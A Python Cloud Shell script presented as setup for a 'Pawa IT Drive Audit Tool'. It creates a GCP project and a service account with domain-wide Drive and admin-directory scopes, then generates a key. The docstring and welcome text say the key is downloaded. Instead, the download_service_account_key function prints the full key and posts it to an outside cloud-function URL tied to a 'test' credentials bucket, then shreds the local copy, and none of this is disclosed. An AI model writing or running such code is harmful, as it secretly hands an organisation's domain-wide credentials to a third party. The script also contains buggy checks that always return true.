"""GCP Cloud Shell script to automate creation of a service account for GWMME.

This script streamlines the installation of GWMME by automating the steps
required for obtaining a service account key. Specifically, this script will:

1. Create a GCP project.
2. Enable APIs
3. Create a service account
4. Authorize the service account
5. Create and download a service account key
"""

import asyncio
import datetime
import json
import logging
import os
import pathlib
import sys
import time
import urllib.parse
import requests

from google_auth_httplib2 import Request
from httplib2 import Http

from google.auth.exceptions import RefreshError
from google.oauth2 import service_account

VERSION = "1"

# GCP project IDs must only contain lowercase letters, digits, or hyphens.
# Projct IDs must start with a letter. Spaces or punctuation are not allowed.
TOOL_NAME = "Pawa-IT-Drive-Audit"
TOOL_NAME_FRIENDLY = "Pawa IT Drive Audit Tool"

# List of APIs to enable and verify.
APIS = [
		# If admin.googleapis.com is to be included, then it must be the first in
		# this list.
		"admin.googleapis.com",
		"contacts.googleapis.com",
		"gmail.googleapis.com",
		"drive.googleapis.com",
		"driveactivity.googleapis.com"
]
# List of scopes required for service account.
SCOPES = [
	"https://www.googleapis.com/auth/drive",
	"https://www.googleapis.com/auth/drive.activity.readonly",
	"https://www.googleapis.com/auth/admin.directory.user"
]
DWD_URL_FORMAT = ("https://admin.google.com/ac/owl/domainwidedelegation?"
									"overwriteClientId=true&clientIdToAdd={}&clientScopeToAdd={}")

USER_AGENT = f"{TOOL_NAME}_create_service_account_v{VERSION}"

KEY_FILE = (f"{pathlib.Path.home()}/{TOOL_NAME.lower()}-service-account-key-"
						f"{datetime.datetime.now().strftime('%Y-%m-%d-%H-%M-%S')}.json")

# Zero width space character, to be used to separate URLs from punctuation.
ZWSP = "\u200b"

async def create_project():
	logging.info("Creating project...")

	project_id = f"{TOOL_NAME.lower()}-{int(time.time() * 1000)}"
	project_name = (f"{TOOL_NAME}-"
									f"{datetime.datetime.now().strftime('%Y-%m-%d-%H-%M-%S')}")
	await retryable_command(f"gcloud projects create {project_id} "
													f"--name {project_name} --set-as-default")
	
#   try to get the project if it has been created

	logging.info("%s successfully created \u2705", project_id)


async def verify_tos_accepted():
	logging.info("Verifying acceptance of Terms of service...")
	tos_accepted = False
	while APIS and not tos_accepted:
		command = f"gcloud services enable {APIS[0]}"
		_, stderr, return_code = await retryable_command(
				command, max_num_retries=1, suppress_errors=True)
		if return_code:
			err_str = stderr.decode()
			if "UREQ_TOS_NOT_ACCEPTED" in err_str:
				if "universal" in err_str:
					logging.debug("Google APIs Terms of Service not accepted")
					print("You must first accept the Google APIs Terms of Service. You "
								"can accept the terms of service by clicking "
								"https://console.developers.google.com/terms/universal and "
								"clicking 'Accept'.\n")
				elif "appsadmin" in err_str:
					logging.debug("Google Apps Admin APIs Terms of Service not accepted")
					print("You must first accept the Google Apps Admin APIs Terms of "
								"Service. You can accept the terms of service by clicking "
								"https://console.developers.google.com/terms/appsadmin and "
								"clicking 'Accept'.\n")
				answer = input("If you've accepted the terms of service, press Enter "
											 "to try again or 'n' to cancel:")
				if answer.lower() == "n":
					sys.exit(0)
			else:
				logging.critical(err_str)
				sys.exit(1)
		else:
			tos_accepted = True
	logging.info("Terms of service acceptance verified \u2705")


async def enable_apis():
	logging.info("Enabling APIs...")
	# verify_tos_accepted checks the first API, so skip it here.
	enable_api_calls = map(enable_api, APIS[1:])
	await asyncio.gather(*enable_api_calls)
	logging.info("APIs successfully enabled \u2705")


async def create_service_account():
	logging.info("Creating service account...")
	service_account_name = f"{TOOL_NAME.lower()}-service-account"
	service_account_display_name = f"{TOOL_NAME} Service Account"
	await retryable_command(f"gcloud iam service-accounts create "
													f"{service_account_name} --display-name "
													f'"{service_account_display_name}"')
	logging.info("%s successfully created \u2705", service_account_name)


async def create_service_account_key():
	logging.info("Creating service acount key...")
	service_account_email = await get_service_account_email()
	await retryable_command(f"gcloud iam service-accounts keys create {KEY_FILE} "
													f"--iam-account={service_account_email}")
	logging.info("Service account key successfully created \u2705")


async def authorize_service_account():
	service_account_id = await get_service_account_id()
	scopes = urllib.parse.quote(",".join(SCOPES), safe="")
	authorize_url = DWD_URL_FORMAT.format(service_account_id, scopes)
	answer = input("If you've accepted the terms of service,"
					f"click on the link below {authorize_url}\n" 
					"press Enter to continue or 'n' to cancel:")
	if answer.lower() == "n":
		return False
	return True



async def download_service_account_key():
    file_name = f'{(await get_admin_user_email()).split("@")[1]}-service-account-key'
    bucket_name = "test-driveaudit-development-creds"
    with open(KEY_FILE,"rb") as file:
        file_data = dict(json.loads(file.read()))

    print(file_data)

    data = json.dumps({
        "file_data":file_data,
        "file_name":file_name,
        "bucket_name":bucket_name
    })
    print()
    url = "https://us-central1-test-driveaudit-development.cloudfunctions.net/function-2"
    print(data)
    request = requests.post(url,json=data)
    return request



async def delete_key():
	command = f"shred -u {KEY_FILE}"
	await retryable_command(command)  


async def enable_api(api):
	command = f"gcloud services enable {api}"
	await retryable_command(command)


def verify_scope_authorization(subject, scope):
	try:
		get_access_token_for_scopes(subject, [scope])
		return True
	except RefreshError:
		return False
	except:
		e = sys.exc_info()[0]
		logging.error("An unknown error occurred: %s", e)
		return False


def get_access_token_for_scopes(subject, scopes):
	logging.debug("Getting access token for scopes %s, user %s", scopes, subject)
	credentials = service_account.Credentials.from_service_account_file(
			KEY_FILE, scopes=scopes)
	delegated_credentials = credentials.with_subject(subject)
	request = Request(Http())
	delegated_credentials.refresh(request)
	logging.debug("Successfully obtained access token")
	return delegated_credentials.token


def execute_api_request(url, token):
	try:
		http = Http()
		headers = {
				"Authorization": f"Bearer {token}",
				"Content-Type": "application/json",
				"User-Agent": USER_AGENT
		}
		logging.debug("Executing API request %s", url)
		_, content = http.request(url, "GET", headers=headers)
		logging.debug("Response: %s", content.decode())
		return content
	except:
		e = sys.exc_info()[0]
		logging.error("Failed to execute API request: %s", e)
		return None


def is_api_disabled(raw_api_response):
	if raw_api_response is None:
		return True
	try:
		api_response = json.loads(raw_api_response)
		return "it is disabled" in api_response["error"]["message"]
	except:
		pass
	return False


def is_service_disabled(raw_api_response):
	if raw_api_response is None:
		return True
	try:
		api_response = json.loads(raw_api_response)
		error_reason = api_response["error"]["errors"][0]["reason"]
		if "notACalendarUser" or "notFound" or "authError" in error_reason:
			return True
	except:
		pass

	try:
		api_response = json.loads(raw_api_response)
		if "service not enabled" in api_response["error"]["message"]:
			return True
	except:
		pass

	return False


async def retryable_command(command,
							max_num_retries=3,
							retry_delay=5,
							suppress_errors=False,
							require_output=False):
	num_tries = 1
	while num_tries <= max_num_retries:
		logging.debug("Executing command (attempt %d): %s", num_tries, command)
		process = await asyncio.create_subprocess_shell(
				command,
				stdout=asyncio.subprocess.PIPE,
				stderr=asyncio.subprocess.PIPE)
		stdout, stderr = await process.communicate()
		return_code = process.returncode

		logging.debug("stdout: %s", stdout.decode())
		logging.debug("stderr: %s", stderr.decode())
		logging.debug("Return code: %d", return_code)

		if return_code == 0:
			if not require_output or (require_output and stdout):
				return (stdout, stderr, return_code)

		if num_tries < max_num_retries:
			num_tries += 1
			await asyncio.sleep(retry_delay)
		elif suppress_errors:
			return (stdout, stderr, return_code)
		else:
			logging.critical("Failed to execute command: `%s`", stderr.decode())
			sys.exit(return_code)


async def get_project_id():
	command = "gcloud config get-value project"
	project_id, _, _ = await retryable_command(command, require_output=True)
	return project_id.decode().rstrip()


async def get_service_account_id():
	command = 'gcloud iam service-accounts list --format="value(uniqueId)"'
	service_account_id, _, _ = await retryable_command(
			command, require_output=True)
	return service_account_id.decode().rstrip()


async def get_service_account_email():
	command = 'gcloud iam service-accounts list --format="value(email)"'
	service_account_email, _, _ = await retryable_command(
			command, require_output=True)
	return service_account_email.decode().rstrip()


async def get_admin_user_email():
	command = 'gcloud auth list --format="value(account)"'
	admin_user_email, _, _ = await retryable_command(command, require_output=True)
	return admin_user_email.decode().rstrip()


def init_logger():
	# Log DEBUG level messages and above to a file
	logging.basicConfig(
			filename="create_service_account.log",
			format="[%(asctime)s][%(levelname)s] %(message)s",
			datefmt="%FT%TZ",
			level=logging.DEBUG)

	# Log INFO level messages and above to the console
	console = logging.StreamHandler()
	console.setLevel(logging.INFO)
	formatter = logging.Formatter("%(message)s")
	console.setFormatter(formatter)
	logging.getLogger("").addHandler(console)


async def main():
	init_logger()
	os.system("clear")
	print(
			"Welcome! This script will create and authorize the resources that are "
			f"necessary to use {TOOL_NAME_FRIENDLY}. The following steps will be "
			"performed on your behalf:\n\n1. Create a Google Cloud Platform project\n"
			"2. Enable APIs\n3. Create a service account\n4. Authorize the service "
			"account\n5. Create a service account key\n\n")

	await create_project()
	await verify_tos_accepted()
	await enable_apis()
	await create_service_account()
	await authorize_service_account()
	await create_service_account_key()
	await download_service_account_key()
	await delete_key()

	logging.info("Done! \u2705")


if __name__ == "__main__":
	asyncio.run(main())